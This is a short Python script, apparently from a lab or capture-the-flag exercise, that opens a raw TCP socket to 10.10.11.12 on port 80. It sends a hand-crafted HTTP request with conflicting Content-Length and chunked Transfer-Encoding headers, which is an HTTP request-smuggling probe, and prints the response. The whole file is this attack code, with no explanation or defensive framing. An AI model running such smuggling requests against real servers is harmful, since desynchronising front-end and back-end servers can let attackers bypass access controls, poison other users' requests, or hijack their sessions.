import requests
import time
HOST = "10.10.11.12"
PORT = 80
import socket

msg="\
GET / HTTP/1.1\n\
Host: "+str(HOST)+"\n\
Content-Type: application/x-www-form-urlencoded\n\
Content-Length: 62\n\
Transfer-Encoding: chunked\n\
\n\nb\n\
q=smuggling\n\
0\n\
"

print(msg)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("Connected")
    s.sendall(msg.encode("ascii"))
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
